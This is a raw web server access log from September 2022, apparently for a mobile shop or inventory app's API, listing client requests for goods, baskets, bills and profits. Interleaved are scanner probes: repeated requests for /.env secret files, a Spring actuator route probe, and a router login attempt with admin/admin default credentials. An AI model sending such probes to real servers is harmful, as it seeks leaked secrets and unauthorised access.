::1 - - [09/Sep/2022:01:16:01 +0000] "GET / HTTP/1.0" 404 139 "http://159.223.82.71:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:127.0.0.1 - - [09/Sep/2022:01:23:25 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:01:23:26 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:01:26:50 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::1 - - [09/Sep/2022:01:47:43 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:01:47:43 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:01:57:13 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::ffff:127.0.0.1 - - [09/Sep/2022:02:05:39 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:02:05:39 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:02:15:07 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:02:15:08 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:02:25:33 +0000] "GET /actuator/gateway/routes HTTP/1.0" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::1 - - [09/Sep/2022:02:38:11 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::ffff:127.0.0.1 - - [09/Sep/2022:03:14:47 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:03:14:48 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:03:17:16 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:17:16 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:17:17 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:17:18 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:18:32 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:18:32 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:18:32 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:18:36 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:18:36 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:18:36 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:18:39 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:18:39 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:18:39 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:19:15 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:19:15 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:19:32 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:19:32 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:19:32 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:20:47 +0000] "POST /api/v1/goods HTTP/1.0" 200 346 "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:20:48 +0000] "POST /api/v1/transactions HTTP/1.0" 200 255 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:20:48 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 4791 "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:20:48 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 430 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:21:08 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 315 "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:21:09 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:21:09 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:21:15 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:21:16 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 4795 "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:21:17 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt&type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 200 3407 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:21:25 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt&type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:21:25 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:21:26 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt&type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:21:26 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:21:27 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt&type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:21:27 +0000] "GET /api/v1/transactions/user?bill=62f8b9678e470b4b6899c07e HTTP/1.0" 200 583 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:21:28 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt&type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:21:32 +0000] "GET /api/v1/goods/user HTTP/1.0" 200 2494 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:21:38 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 200 5347 "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:21:46 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:21:53 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:21:53 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:22:01 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "Dalvik/2.1.0 (Linux; U; Android 9; SM-N950N Build/PPR1.180610.011)"
::1 - - [09/Sep/2022:03:22:01 +0000] "GET /api/v1/goods/631ab10ff66eb6d6a8720d3b HTTP/1.0" 200 406 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:22:01 +0000] "GET /api/v1/transactions/user?good=631ab10ff66eb6d6a8720d3b&sort=-createdAt HTTP/1.0" 200 550 "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:22:02 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:22:02 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:22:09 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:22:09 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:22:26 +0000] "POST /api/v1/transactions HTTP/1.0" 200 254 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:22:27 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 429 "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:22:27 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 429 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:22:33 +0000] "POST /api/v1/bills/drain HTTP/1.0" 200 317 "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:22:34 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:22:34 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:22:45 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:22:45 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 4793 "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:22:49 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 200 5355 "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:23:03 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:23:03 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:23:03 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:23:04 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:23:05 +0000] "GET /api/v1/goods/user HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:03:47:06 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:03:47:06 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:04:29:15 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::ffff:127.0.0.1 - - [09/Sep/2022:04:42:10 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:04:42:10 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:05:05:25 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:05:05:28 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:05:07:18 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:05:07:19 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 457 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:05:07:19 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 3443 "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:05:07:39 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:05:07:39 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:05:07:42 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:05:07:45 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:05:07:45 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:05:07:45 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:05:08:08 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:05:08:08 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:05:08:08 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:05:08:20 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:05:08:36 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 200 3718 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:05:13:05 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:05:13:05 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:05:20:55 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::1 - - [09/Sep/2022:05:55:20 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:05:55:21 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:06:09:16 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:127.0.0.1 - - [09/Sep/2022:06:26:49 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
::1 - - [09/Sep/2022:06:27:27 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0"
::ffff:127.0.0.1 - - [09/Sep/2022:06:48:43 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:06:48:43 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:06:54:29 +0000] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 404 162 "-" "-"
::1 - - [09/Sep/2022:06:57:44 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:06:57:45 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:07:14:12 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:07:14:13 +0000] "GET /robots.txt HTTP/1.0" 404 149 "-" "-"
::1 - - [09/Sep/2022:07:14:14 +0000] "GET /sitemap.xml HTTP/1.0" 404 150 "-" "-"
::ffff:127.0.0.1 - - [09/Sep/2022:07:14:14 +0000] "GET /.well-known/security.txt HTTP/1.0" 404 163 "-" "-"
::1 - - [09/Sep/2022:07:14:15 +0000] "GET /favicon.ico HTTP/1.0" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
::ffff:127.0.0.1 - - [09/Sep/2022:07:18:25 +0000] "GET / HTTP/1.0" 404 139 "-" "python-requests/2.28.1"
::ffff:127.0.0.1 - - [09/Sep/2022:07:32:45 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:07:32:45 +0000] "GET /api/v1/categories HTTP/1.0" 200 426 "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:07:32:45 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 1100 "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:07:32:47 +0000] "GET /api/v1/users/62fbbc03fd2881af5a4e559a HTTP/1.0" 200 258 "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:07:32:47 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:07:32:47 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:07:33:20 +0000] "GET /api/v1/users/62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:07:36:57 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:07:36:57 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:07:36:57 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:07:36:57 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:07:36:57 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:07:36:58 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:07:37:01 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:07:37:02 +0000] "GET /api/v1/templates?createUser=62fbbc03fd2881af5a4e559a HTTP/1.0" 200 279 "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:07:37:02 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:07:37:04 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:07:37:04 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:07:37:04 +0000] "GET /api/v1/templates?createUser=62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:07:37:04 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:07:37:04 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:07:37:04 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:07:37:05 +0000] "GET /api/v1/templates?createUser=62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:07:37:05 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:07:37:06 +0000] "GET /api/v1/templates?createUser=62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:07:37:06 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:07:37:06 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:07:37:06 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:07:37:06 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:07:37:27 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:07:37:27 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:07:43:01 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
::1 - - [09/Sep/2022:07:56:40 +0000] "GET /ip.php?Z75392122862Q1 HTTP/1.0" 404 145 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
::ffff:127.0.0.1 - - [09/Sep/2022:08:02:15 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:08:02:15 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:08:02:15 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:08:02:57 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:08:02:57 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:08:02:57 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:08:02:59 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
